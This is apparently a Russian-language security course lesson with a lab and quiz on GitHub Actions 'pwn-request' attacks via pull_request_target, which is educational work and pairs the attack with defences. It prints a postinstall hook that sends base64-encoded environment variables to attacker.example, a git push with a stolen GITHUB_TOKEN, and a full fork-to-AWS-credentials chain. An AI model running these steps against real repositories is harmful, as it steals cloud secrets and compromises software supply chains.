---
id: cloud-github-actions-pwn
title: "GitHub Actions pwn-requests: pull_request_target и инъекции"
category: cloud
parent: cloud-cicd-deep
difficulty: expert
order: 3
tags: [cloud, github-actions, pwn-request, workflow-injection, oidc, secrets, pr]
prerequisites: [cloud-cicd-deep, cloud-cicd-github-actions]
useful_for:
  - "Атаки на GitHub Actions публичных репозиториев"
  - "Кража облачных кредов через CI"
  - "Bug bounty: workflow injection"
estimated_minutes: 55
summary: "GitHub Actions: pull_request_target, workflow_run, issue_comment и инъекции в ${{ }}. Как из PR из форка получить секреты и токены облака (OIDC)."
lab:
  kind: shell
  title: "Практика: pull_request_target и утечка секрета"
  toolset: [core]
  workdir: /home/student/gha
  files: [task.md, notes.md, pr-workflow.yml, action-log.txt]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Прочитай `pr-workflow.yml`: триггер `pull_request_target` + checkout кода из PR = инъекция."
    - "Секрет доступен джобе; лог `action-log.txt` показывает, что он утёк."
    - "Найди флаг: `grep nto action-log.txt > found.txt`."

---
## Задача

В `cloud-cicd-github-actions` мы разбирали инъекцию в `run`. Теперь — отдельный класс атак на GitHub Actions: **pwn-request**. Это когда обычный **pull request из форка** (то есть от постороннего) приводит к исполнению кода с секретами базового репозитория. Задача: показать полную цепочку от форка до облачных кредов. Разберём на публичном репозитории.

## Данные: публичный репозиторий и его workflow

У цели есть открытый репозиторий `acme/webapp`. Смотрим workflow'ы:

```
$ gh workflow list --repo acme/webapp
Deploy      active
CI          active
```

Читаем `Deploy`:

```yaml
on: pull_request_target
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm ci
      - run: npm run build
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/deploy
```

Три опасных факта: триггер `pull_request_target`, checkout **кода PR** (`head.sha`) и дальше `npm ci` с доступом к AWS-роли.

## Пробуем в лоб: почему обычный PR не подходит

Событие `pull_request` запускает workflow **без секретов** — так GitHub защищает базовый репозиторий от чужого кода. Но `pull_request_target` запускается в контексте **базового** репозитория, то есть **с секретами**. А `checkout` с `ref: head.sha` берёт код **из PR атакующего**.

Комбинация «секреты base + код PR» и есть pwn-request. Отдельно каждое безопасно; вместе — RCE с секретами.

## Приём: подсовываем свой install-скрипт

Форкаем `acme/webapp`, правим `package.json` — добавляем хук, который выполнится на `npm ci`:

```json
{ "scripts": { "postinstall": "curl -s -d \"$(env|base64 -w0)\" https://attacker.example/x" } }
```

Открываем PR. `pull_request_target` запускает `Deploy` на базовом репозитории, `npm ci` исполняет `postinstall` — и окружение job'а уходит к нам. В нём — временные AWS-креды, которые выдала роль `deploy`.

## Полный прогон: от форка до AWS

1. **Разведка.** `gh workflow list`, чтение `.github/workflows/*.yml`.
2. **Поиск триггера.** `pull_request_target` + checkout `head.sha`.
3. **Форк и правка.** Меняем `package.json`/тесты/скрипты сборки.
4. **PR.** Workflow запускается с секретами base.
5. **Эксфильтрация.** `postinstall` отправляет env.
6. **Проверка AWS-кредов.**

```
$ AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... aws sts get-caller-identity
{ "Arn": "arn:aws:sts::123456789012:assumed-role/deploy/GitHubActions" }
```

Роль `deploy` — наша.

## Другие триггеры: workflow_run и issue_comment

Pwn-request — не единственный триггер, исполняющий код из недоверенного источника:

- **`workflow_run`** — запускается после другого workflow; если он checkout'ит артефакт/код PR, получает те же проблемы.
- **`issue_comment`** — комментарий может нести инъекцию в `run` (см. `cloud-cicd-github-actions`).
- **`pull_request` с `pull_request_target`-подобной логикой** — иногда checkout кода PR делают в `pull_request`, но с `persist-credentials: true`, что тоже даёт запись.

Проверка:

```
$ grep -rn 'pull_request_target\|workflow_run\|issue_comment' .github/workflows/
$ grep -rn 'head.sha\|head.ref\|github.head_ref' .github/workflows/
```

## Что ещё можно сделать из PR

Инъекция кода — не единственный результат pwn-request. Из job'а с секретами можно:

- **Писать в base-репозиторий.** Если `GITHUB_TOKEN` имеет `contents: write`, пушим коммит в ветку base — закрепляемся:

```
$ git push https://x-access-token:$GITHUB_TOKEN@github.com/acme/webapp HEAD:refs/heads/main
```

- **Травить кэш.** `actions/cache` с ключом, который потом подхватит доверенный workflow; в кэш кладём подменённый артефакт.
- **Менять артефакты релиза.** Если job публикует пакет/образ — публикуем свой.
- **Использовать OIDC.** Если в job'е `id-token: write`, принимаем облачную роль (см. `cloud-oidc-federation`).

Все эти пути опираются на одно: наш код исполняется в доверенном контексте base-репозитория.

## Частые ошибки

- **`pull_request_target` + checkout `head.sha`.** Классический pwn-request.
- **Секреты деплоя в job'е, который запускается на PR.** Разделяйте сборку и деплой.
- **`persist-credentials: true`** в недоверенном checkout — токен остаётся в `.git/config`.
- **Нет required reviewers.** Деплой идёт без человека.
- **`permissions: write-all`.** Токен может коммитить и пушить.

## Защита и что ломает атаку

- **Не checkout'ить код PR под `pull_request_target`.** Если нужен код PR — используйте `pull_request` (без секретов).
- **`permissions: contents: read`** и минимум прав у job'а.
- **Environment с required reviewers** для деплой-секретов.
- **`actions/checkout` с `persist-credentials: false`** в недоверенных контекстах.
- **Отдельный workflow без секретов** для сборки PR, и отдельный — для деплоя.

## Если не сработало

- **Триггер `pull_request`, а не `pull_request_target`** — секретов нет.
- **Нет checkout кода PR** — наш код не исполняется.
- **Секреты за environment с approval** — job ждёт человека.
- **`permissions` урезаны** — нет доступа к OIDC/записи.
- **Сборка изолирована (без install-хуков)** — `postinstall` не сработает.

## Мини-сценарий: PR из форка целиком

1. **Разведка.** `gh workflow list` и чтение `.github/workflows/deploy.yml` → триггер `pull_request_target`, checkout `head.sha`, `npm ci`, роль `deploy`.
2. **Форк.** `gh repo fork acme/webapp` → получаем свой `attacker/webapp`.
3. **Правка.** В своей копии меняем `package.json`: добавляем `postinstall`, который шлёт env на наш сервер.
4. **PR.** `gh pr create --repo acme/webapp` → workflow запускается **с секретами base**.
5. **Сборка.** `npm ci` исполняет `postinstall` → env (с временными AWS-кредами) уходит к нам.
6. **Проверка.** `aws sts get-caller-identity` с добытыми кредами → роль `deploy`.
7. **Закрепление (опц.).** Если `GITHUB_TOKEN` с `contents: write` — пушим коммит в base.

От форка до облачных кредов — без единой уязвимости в самом приложении, только за счёт смешения секретов и кода PR.

## Разбор: секреты и недоверенный код нельзя смешивать

Pwn-request существует потому, что один workflow совмещает два несовместимых свойства: **секреты base-репозитория** и **исполнение кода из недоверенного источника**. По отдельности каждое нормально: сборка PR без секретов — стандарт; деплой с секретами из доверенной ветки — тоже. Ошибка — в их соединении. Отсюда и лечение: разделить pipeline на два. Первый workflow (на `pull_request`, без секретов) собирает и тестирует код PR. Второй (на `push` в `main` или `workflow_run`) деплоит уже доверенный, слитый код, имея доступ к секретам. Так недоверенный код физически не встречается с ключами.

И следите за `persist-credentials`: даже в безопасном контексте он оставляет токен в `.git/config`.

И помните: разделение workflow на сборку и деплой — самый надёжный способ не смешивать доверие.

## Что мы теперь знаем

1. Pwn-request = `pull_request_target` + checkout кода PR + исполнение.
2. Секреты base-репозитория доступны нашему коду из форка.
3. `postinstall`/скрипты сборки — канал выполнения.
4. `workflow_run` и `issue_comment` — родственные триггеры.
5. Защита — не смешивать секреты и код PR, узкие permissions.

## На что смотреть дальше

- `pull_request_target`/`workflow_run` в workflow'ах.
- `head.sha`/`head.ref` в checkout.
- `permissions:` и наличие OIDC (`id-token: write`).
- Environment и required reviewers.
- Скрипты сборки, исполняемые автоматически.

## Быстрая проверка

```bash
grep -rn 'pull_request_target\|workflow_run' .github/workflows/
grep -rn 'head.sha\|github.head_ref' .github/workflows/
grep -rn 'id-token: write\|permissions:' .github/workflows/
```

## Квиз

Проверь себя.

```quiz
- question: "Что такое pwn-request?"
  options:
    - "PR из форка исполняет код с секретами base-репозитория"
    - "Скан уязвимостей репозитория"
    - "Автоматический merge"
    - "Формат коммита"
  answer: 0
  explanation: "Секреты base + код PR = RCE."
- question: "Почему pull_request_target опаснее pull_request?"
  options:
    - "Он запускается с секретами базового репозитория"
    - "Он быстрее"
    - "Он шифрует логи"
    - "Он удаляет форки"
  answer: 0
  explanation: "pull_request_target работает в контексте base с секретами."
- question: "Какой checkout делает pwn-request возможным?"
  options:
    - "checkout с ref: head.sha (код PR)"
    - "checkout без ref"
    - "checkout базовой ветки"
    - "checkout тэга"
  answer: 0
  explanation: "Код из PR попадает в доверенный контекст."
- question: "Какое событие тоже исполняет недоверенный код?"
  options:
    - "workflow_run"
    - "schedule"
    - "workflow_dispatch"
    - "release"
  answer: 0
  explanation: "workflow_run может тянуть артефакты/код PR."
- question: "Как защититься от pwn-request?"
  options:
    - "Не смешивать секреты и код PR; разделить сборку и деплой"
    - "Отключить Actions"
    - "Убрать тесты"
    - "Дать всем права"
  answer: 0
  explanation: "Разделение и узкие permissions закрывают вектор."
```

## Куда дальше

В следующем уроке (`cloud-cloudtrail-evasion`) мы перейдём к детекту: как CloudTrail и GuardDuty фиксируют атакующего и где у них слепые зоны. А пока главное: если workflow исполняет код из PR с секретами — любой посторонний может добраться до облака.

## Где пригодится

- **Bug bounty:** pwn-requests в публичных репозиториях.
- **Red team:** от форка к облачным кредам.
- **Пентест:** аудит GitHub Actions.
- **Работа/DevSecOps:** разделение сборки/деплоя, узкие permissions.
- **Дальше по дереву:** `cloud-cicd-github-actions`, `cloud-oidc-federation`.
